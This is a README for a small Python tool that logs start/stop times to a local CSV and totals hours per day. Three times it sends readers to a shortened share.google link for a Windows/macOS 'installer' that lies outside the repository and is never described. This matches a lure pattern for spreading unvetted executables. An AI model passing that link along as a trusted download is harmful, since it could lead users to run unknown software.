![Time Track CSV](assets/hero.png)

# Time Track CSV

*Hours in a file, not a SaaS.*

## Overview

**Time Track CSV** is a developer utility. Log start/stop entries to a local CSV and print a daily total.

You need a day total for a timesheet.

Run it in a clone, check the output, then keep or discard the file it wrote.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Start stop
- Tags
- Daily sum
- Local CSV

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/hazelwarren24/time-track-csv

MIT license. See `LICENSE`.
